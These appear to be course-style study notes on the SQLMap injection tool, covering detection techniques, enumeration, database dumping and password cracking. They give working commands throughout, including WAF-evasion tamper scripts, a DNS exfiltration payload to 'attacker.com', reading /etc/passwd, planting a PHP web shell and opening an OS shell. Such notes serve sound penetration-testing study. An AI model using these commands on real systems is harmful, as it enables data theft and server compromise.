# SQLMap Essentials

SQLMap = open-source Python tool automating SQLi detection and exploitation, maintained since 2006. Covers target connection, injection detection, fingerprinting, enumeration, optimization, protection bypass (tamper scripts), DB content retrieval, file system access, and OS command execution. Widest DBMS support of any SQLi tool (MySQL, PostgreSQL, Oracle, MSSQL, SQLite, MariaDB, and ~30 more). Install: preinstalled on Pwnbox/security distros, `sudo apt install sqlmap`, or `git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git` → `python sqlmap.py`.

## SQLMap Overview

Techniques (`--technique=BEUSTQ`, all on by default):

- **B — Boolean-based blind** (`AND 1=1`): TRUE/FALSE distinguished by response differences (content, HTTP code, titles, filtered text). ~1 bit per request, ~7-8 requests per character. Most common SQLi type in the wild.
- **E — Error-based** (`AND GTID_SUBSET(@@version,0)`): DBMS errors carry query results in ~200-byte chunks. Faster than everything except UNION.
- **U — Union query-based** (`UNION ALL SELECT 1,@@version,3`): injected results rendered in the response — potentially a whole table in one request. Fastest.
- **S — Stacked queries** (`; DROP TABLE users`): piggy-back extra statements; needed for non-query statements (INSERT/UPDATE/DELETE); MSSQL and PostgreSQL support by default.
- **T — Time-based blind** (`AND 1=IF(2>1,SLEEP(5),0)`): response time is the TRUE/FALSE signal. Slowest; used when boolean-based can't work (e.g. injection in a non-query statement with no page effect).
- **Q — Inline queries** (`SELECT (SELECT @@version)`): query embedded in the original; uncommon.
- **Out-of-band** (`LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))`): DNS exfiltration when everything else fails — sqlmap running on the controlled DNS domain collects data from non-existent subdomain lookups.

## Getting Started with SQLMap

Help: `-h` basic, `-hh` advanced (includes all target/request options), wiki = the manual.

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

`-u` = target URL, `--batch` = auto-answer every prompt with the default. The run reports each technique as it's confirmed, then prints the injection-point summary: parameter, type, title, and the working payload for each technique (boolean/error/time/UNION) — that payload list is the manual-exploitation cheat sheet. Everything logs to `~/.sqlmap/output/<target>/`, and session data there lets later runs resume without re-detecting.

## SQLMap Output Description

What the log lines mean:

- `target URL content is stable` — identical requests return consistent responses; differences from payloads are then meaningful (noise auto-removed otherwise).
- `parameter appears to be dynamic` — value changes affect the response, so it's probably DB-linked. Static output = value not processed.
- `heuristic (basic) test ... might be injectable (possible DBMS: 'MySQL')` — invalid-value probe caused a DBMS error. Indication, not proof.
- `heuristic (XSS) test ...` — bonus XSS heuristic check, useful on big parameter sweeps.
- `it looks like the back-end DBMS is 'MySQL'` — accept to skip other DBMSes' payloads; follow-up prompt extends level/risk for that DBMS.
- `reflective value(s) found and filtering out` — payload echo in the response; filtered before comparison.
- `appears to be ... injectable` — candidate finding; false-positives get removed by end-of-run logic checks. `(with --string="luther")` = a constant string distinguishes TRUE/FALSE, a strong signal.
- `time-based comparison requires a larger statistical model` — collecting baseline response times to spot deliberate delays even on laggy networks.
- `automatically extending ranges for UNION query` / `'ORDER BY' technique appears to be usable` — UNION checks are request-hungry (capped at 10 normally); a hit elsewhere extends the budget, and ORDER BY binary-search speeds column-count discovery.
- `GET parameter 'id' is vulnerable` — confirmed. Keep testing other parameters only if you want the full report.
- `sqlmap identified the following injection point(s)` — final, provably exploitable list.
- `fetched data logged to text files under ...` — output/session directory for this target.

## Running SQLMap on an HTTP Request

Best setup trick: browser DevTools → Network → right-click the request → **Copy as cURL** → paste, swap `curl` for `sqlmap`. Identical headers, cookies, everything.

- **GET**: `-u 'http://www.example.com/?id=1'` (a testable parameter, or auto-discovery flags `--crawl` / `--forms` / `-g`, is required).
- **POST**: `--data 'uid=1&name=test'` tests both params; `-p uid` narrows to one; or mark inline with `*`: `--data 'uid=1*&name=test'`.
- **Full request file**: `-r req.txt` — the entire HTTP request (captured in Burp, "Copy to file") for complex headers/bodies; `*` works inside the file too (`/?id=*`).
- **Headers**: `--cookie='PHPSESSID=...'` or `-H='Cookie:...'`; same for `--host`, `--referer`, `-A`. `--random-agent` picks a real browser UA (many protections drop sqlmap's default UA outright); `--mobile` imitates a phone.
- **Header injection**: put the marker after the value — `--cookie="id=1*"`.
- **Other methods**: `--method PUT`.
- **JSON/XML bodies**: supported via `--data` (simple) or `-r` (complex); sqlmap prompts to process JSON.

## Handling SQLMap Errors

Debugging ladder:

- `--parse-errors` — surface DBMS errors inline during the run.
- `-t /tmp/traffic.txt` — full sent/received traffic to a file for manual review.
- `-v 6` — maximum verbosity: every request and response printed live.
- `--proxy` — route everything through Burp for interactive inspection/replay.

## Attack Tuning

Payload anatomy: **vector** (the SQL payload itself) + **boundaries** (prefix/suffix wrapping that makes it fit the vulnerable statement).

- **`--prefix` / `--suffix`** — for closures the default boundary set doesn't cover. E.g. code `WHERE id LIKE (('" . $_GET["q"] . "'))` needs `--prefix="%'))" --suffix="-- -"` to produce `... LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) ...`.
- **`--level` (1-5, default 1)** — extends both boundaries and vectors by expectancy of success.
- **`----risk` (1-3, default 1)** — extends vectors by risk of target-side damage (data loss/DoS). Raise it yourself when OR payloads are a must (login pages) — OR vectors against UPDATE/DELETE statements are why they're opt-in.
- Payload counts: default = up to 72 per parameter; `--level=5 --risk=3` = 7,865. Watch the difference with `-v 3` (prints `[PAYLOAD]` lines).
- **Comparison tuning**: `--code=200` (TRUE = that HTTP code), `--titles` (compare `<title>` only), `--string=success` (TRUE contains the value), `--text-only` (strip HTML tags, compare visible text).
- **`--technique=BEU`** — e.g. skip time-based and stacked, run boolean/error/union.
- **UNION tuning**: `--union-cols=17` (known column count), `--union-char=a` (different dummy filler), `--union-from=users` (DBMS needing a FROM appendix, e.g. Oracle).

## Database Enumeration

sqlmap carries per-DBMS query sets (queries.xml) — `inband` variants for UNION/error-based, `blind` variants (row-by-row, LIMIT %d,1) for blind situations. After detection, later runs resume the injection from session files and go straight to enumeration.

Basics in one command:

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Tables and dumps:

```bash
sqlmap -u ... --tables -D testdb
sqlmap -u ... --dump -T users -D testdb                      # CSV to ~/.sqlmap/output/<target>/dump/...
sqlmap -u ... --dump -T users -D testdb -C name,surname      # column subset
sqlmap -u ... --dump -T users -D testdb --start=2 --stop=3   # row range
sqlmap -u ... --dump -T users -D testdb --where="name LIKE 'f%'"
sqlmap -u ... --dump -D testdb                                # whole database
sqlmap -u ... --dump-all --exclude-sysdbs                     # everything, skip system DBs
```

`--dump-format` selects CSV (default), HTML, or SQLite for later offline browsing. DB `root`/DBA ≠ OS root — DBMS-privileged, but modern deployments keep OS privileges minimal.

## Advanced Database Enumeration

- **`--schema`** — full structure: every database/table/column with types.
- **`--search`** — LIKE search across identifiers when the schema is huge: `--search -T user` (tables named *user*), `--search -C pass` (columns named *pass* — instantly locates password columns across the DBMS).
- **Password cracking** — `--dump` recognizes hash formats and offers a built-in dictionary attack (31 hash algorithms, 1.4M-entry wordlist, multiprocess): dumped rows come back with `(cleartext)` annotations.
- **`--passwords`** — DBMS-level user credentials (mysql.user etc.), same crack prompt, e.g. `root ... clear-text password: testpass`.
- **`--all --batch`** — automate the entire enumeration; long-running, dig through the output files afterward.

## Bypassing Web Application Protections

- **Anti-CSRF tokens**: `--csrf-token="csrf-token"` — sqlmap re-parses fresh tokens from responses; params containing csrf/xsrf/token trigger an auto-prompt anyway.
- **Unique-value params**: `--randomize=rp` — randomize the named param's value per request.
- **Calculated params**: `--eval="import hashlib; h=hashlib.md5(id).hexdigest()"` — Python evaluated before each request for digest-style checks (h=MD5(id)).
- **IP concealing**: `--proxy="socks4://ip:port"`, `--proxy-file` (rotate on failure), `--tor` (auto-finds local SOCKS 9050/9150), `--check-tor` (verifies via check.torproject.org).
- **WAF**: initial probe sends a malicious-looking payload on a nonexistent param; ModSecurity answers 406. Detection uses identYwaf signatures (80 WAFs). `--skip-waf` skips the noise.
- **UA blacklisting**: `--random-agent` — first thought on immediate 5XX errors.
- **Tamper scripts** — `--tamper=script1,script2` (chained by priority). Notables:

```text
0eunion                    UNION → e0UNION
base64encode               base64 the payload
between                    > → NOT BETWEEN 0 AND #, = → BETWEEN # AND #
commalesslimit             LIMIT M,N → LIMIT N OFFSET M
equaltolike                = → LIKE
halfversionedmorekeywords  versioned comment before each keyword
modsecurityversioned/zeroversioned  embrace query in (zero-)versioned comment
percentage                 SELECT → %S%E%L%E%C%T
randomcase                 SELECT → SEleCt
space2comment / space2dash / space2hash / space2plus / space2randomblank / space2mssqlblank   space variants
symboliclogical            AND/OR → && / ||
versionedkeywords / versionedmorekeywords   versioned-comment per keyword
```

`--list-tampers` for all; custom scripts possible (e.g. second-order SQLi).

- **`--chunked`** — split POST body into chunks so blacklisted keywords straddle boundaries.
- **HPP** — payload split across repeated param names (`?id=1&id=UNION&id=SELECT...`) on platforms that concatenate them (ASP).

## OS Exploitation

File ops need privileges (MySQL: LOAD DATA + INSERT to read via `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;`; write additionally needs `secure_file_priv` permitting it). DBA makes it all likely — check with `--is-dba` first (`current user is DBA: True/False`).

**Read files:**

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
# saved to ~/.sqlmap/output/<target>/files/_etc_passwd
```

**Write files** (e.g. a web shell to the webroot):

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
curl http://www.example.com/shell.php?cmd=ls+-la
```

**OS shell:**

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

Prompts (auto-answered with `--batch`) for the web language (PHP default) and the webroot — common locations list, custom, or brute-force search. Uses file-write stagers, UDF tricks (sys_eval/sys_exec from an uploaded .so), or DB-native command execution (xp_cmdshell on MSSQL). If the default technique stalls ("No output"), pin a better one: `--os-shell --technique=E`.